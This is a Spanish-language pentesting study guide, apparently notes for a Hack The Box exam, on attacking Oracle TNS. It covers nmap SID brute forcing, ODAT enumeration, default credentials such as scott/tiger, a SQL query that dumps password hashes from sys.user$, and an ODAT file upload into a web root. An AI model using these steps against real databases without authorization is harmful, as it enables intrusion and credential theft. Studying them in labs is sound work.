
## 1. Conceptos básicos

**Oracle Transparent Network Substrate (TNS)** es un protocolo de comunicación que permite conectar aplicaciones cliente con bases de datos Oracle.

- **Puerto por defecto:** TCP/1521.
    
- **SID (System Identifier):** identifica una instancia concreta de Oracle.
    
- **Listener:** recibe las conexiones entrantes y las dirige a la instancia correspondiente.
    
- **ODAT:** herramienta de pentesting para enumerar y explotar vulnerabilidades en bases de datos Oracle.
    
- **SQL*Plus:** cliente para conectarse a Oracle y ejecutar consultas SQL.
    

### Archivos de configuración

|Archivo|Función|
|---|---|
|`tnsnames.ora`|Configura los nombres de servicios y sus direcciones de conexión.|
|`listener.ora`|Configura el listener del servidor y los servicios que atiende.|

Ruta habitual:

```
$ORACLE_HOME/network/admin
```

### Configuraciones y credenciales interesantes

- Oracle 9: contraseña predeterminada `CHANGE_ON_INSTALL`.
    
- Oracle DBSNMP: credenciales predeterminadas `dbsnmp`.
    
- Cuenta de ejemplo: `scott/tiger`.
    
- Comprobar posibles credenciales débiles, servicios expuestos y configuraciones incorrectas.

## 2. Instalar y comprobar ODAT

ODAT (_Oracle Database Attacking Tool_) permite enumerar servicios Oracle, descubrir credenciales y comprobar distintas posibilidades de explotación.

### Instalación

```
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1

cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0

python3 setup.py build
sudo python3 setup.py install

cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/

pip install python-libnmap
git submodule init
git submodule update

sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y

pip3 install pycryptodome
pip3 install openpyxl
```

### Comprobar la instalación

```
./odat.py -h
```

Si muestra la ayuda y los módulos disponibles, podemos utilizar la herramienta.

## 3. Reconocimiento del servicio

### Escanear el puerto 1521

```
sudo nmap -p1521 -sV <IP> --open
```

Permite identificar si el listener Oracle está activo y obtener información sobre su versión.

### Enumerar información del listener

```
sudo nmap -p1521 -sV <IP> --script oracle-tns-version
```

Este comando puede utilizarse si el script está disponible en la instalación local de Nmap.

### Descubrir SID mediante fuerza bruta

```
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
```

Ejemplo de resultado:

```
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0
| oracle-sid-brute:
|_  XE
```

En este caso, el SID descubierto es `XE`.

**Importante:** el SID identifica la instancia de la base de datos; no es una contraseña ni un usuario.

## 4. Enumeración con ODAT

Ejecutar los módulos de enumeración disponibles:

```
./odat.py all -s <IP>
```

ODAT puede comprobar diferentes componentes de Oracle y buscar información como:

- Versiones y servicios.
    
- SID y nombres de bases de datos.
    
- Cuentas de usuario.
    
- Credenciales débiles.
    
- Vulnerabilidades y configuraciones incorrectas.
    
- Posibilidades de lectura o escritura de archivos, según los privilegios disponibles.
    

Ejemplo de credenciales encontradas:

```
[+] Valid credentials found: scott/tiger
```

Las credenciales descubiertas deben probarse para confirmar que permiten iniciar sesión.

## 5. Conexión mediante SQL*Plus

### Instalación del cliente

```
sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus
```

### Solucionar un error de biblioteca compartida

Si aparece:

```
sqlplus: error while loading shared libraries:
libsqlplus.so: cannot open shared object file
```

Configurar la ruta de la biblioteca indicada en el ejemplo de HTB:

```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

La ruta debe corresponder a la versión del cliente instalada.

### Comprobar SQL*Plus

```
sqlplus -v
```

### Conectarse a una base de datos

```
sqlplus <usuario>/<contraseña>@<IP>/<SID>
```

Ejemplo:

```
sqlplus scott/tiger@10.129.204.235/XE
```

Si la conexión funciona, aparecerá el prompt:

```
SQL>
```

Un mensaje como `ORA-28002` puede indicar que la contraseña está próxima a caducar; no significa necesariamente que el inicio de sesión haya fallado.

## 6. Enumeración de la base de datos

### Listar tablas accesibles

```
SELECT table_name FROM all_tables;
```

### Consultar los roles del usuario actual

```
SELECT * FROM user_role_privs;
```

Esto permite comprobar qué roles tiene concedidos el usuario, por ejemplo `CONNECT`, `RESOURCE` o `DBA`.

### Probar una conexión con privilegios SYSDBA

```
sqlplus <usuario>/<contraseña>@<IP>/<SID> as sysdba
```

Ejemplo del laboratorio:

```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

**No implica que cualquier usuario pueda obtener privilegios SYSDBA.** La conexión solo funcionará si la cuenta y la configuración permiten esa autenticación.

### Consultar los hashes de contraseña

Si disponemos de los privilegios necesarios:

```
SELECT name, password FROM sys.user$;
```

La consulta intenta obtener los nombres de usuario y los valores de contraseña almacenados en `SYS.USER$`. El acceso puede estar restringido y el formato de los hashes depende de la versión de Oracle.

## 7. Subida de archivos con ODAT

En determinadas configuraciones, ODAT puede utilizar funcionalidades de Oracle para escribir archivos en el sistema de destino. Para que funcione, la cuenta debe disponer de los privilegios necesarios y la ruta debe ser accesible mediante el componente utilizado.

### Rutas web habituales

|Sistema operativo|Directorio raíz web habitual|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

### Crear un archivo de prueba

```
echo "Oracle File Upload Test" > testing.txt
```

### Subir el archivo

Ejemplo del laboratorio:

```
./odat.py utlfile -s <IP> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Parámetros principales:

|Parámetro|Función|
|---|---|
|`utlfile`|Selecciona el módulo de ODAT para operaciones con archivos.|
|`-s`|Especifica el servidor de destino.|
|`-d`|Indica el SID o la base de datos utilizada por la herramienta.|
|`-U`|Usuario de Oracle.|
|`-P`|Contraseña.|
|`--sysdba`|Solicita utilizar la conexión con privilegios SYSDBA.|
|`--putFile`|Indica el directorio remoto, el nombre del archivo remoto y el archivo local.|

La operación depende de los permisos de Oracle y de las restricciones del sistema de destino.

### Verificar la subida

Si el servidor web permite acceder al archivo:

```
curl http://<IP>/testing.txt
```

Resultado esperado:

```
Oracle File Upload Test
```

Esto confirma que el archivo de prueba se ha escrito y que el servidor web puede servirlo.

## 8. Flujo de trabajo recomendado

1. **Descubrir el servicio:**
    
    ```
    sudo nmap -p1521 -sV <IP> --open
    ```
    
2. **Identificar el SID:**
    
    ```
    sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
    ```
    
3. **Enumerar con ODAT:**
    
    ```
    ./odat.py all -s <IP>
    ```
    
4. **Validar las credenciales encontradas** y conectarse con SQL*Plus:
    
    ```
    sqlplus <usuario>/<contraseña>@<IP>/<SID>
    ```
    
5. **Enumerar tablas y privilegios:**
    
    ```
    SELECT table_name FROM all_tables;
    SELECT * FROM user_role_privs;
    ```
    
6. **Evaluar los privilegios efectivos** antes de intentar operaciones adicionales.
    
7. **Comprobar las posibilidades de lectura o escritura de archivos** solo cuando la configuración y los permisos lo permitan.

## 9. Comandos clave para el examen

|Objetivo|Comando|
|---|---|
|Identificar Oracle TNS|`sudo nmap -p1521 -sV <IP> --open`|
|Descubrir SID|`sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute`|
|Ejecutar enumeración ODAT|`./odat.py all -s <IP>`|
|Comprobar SQL*Plus|`sqlplus -v`|
|Conectarse a Oracle|`sqlplus usuario/contraseña@IP/SID`|
|Listar tablas accesibles|`SELECT table_name FROM all_tables;`|
|Consultar roles|`SELECT * FROM user_role_privs;`|
|Consultar hashes, si hay permisos|`SELECT name, password FROM sys.user$;`|
|Comprobar un archivo servido por HTTP|`curl http://<IP>/testing.txt`|

**Puntos importantes:**

- El puerto habitual de Oracle TNS es **TCP/1521**.
    
- El SID identifica una instancia concreta de Oracle.
    
- `tnsnames.ora` configura las conexiones del cliente y `listener.ora` configura el listener.
    
- ODAT permite enumerar componentes de Oracle y comprobar posibles debilidades.
    
- Las credenciales válidas no garantizan privilegios administrativos.
    
- Las operaciones con archivos dependen de los privilegios de la cuenta y de la configuración del servidor.
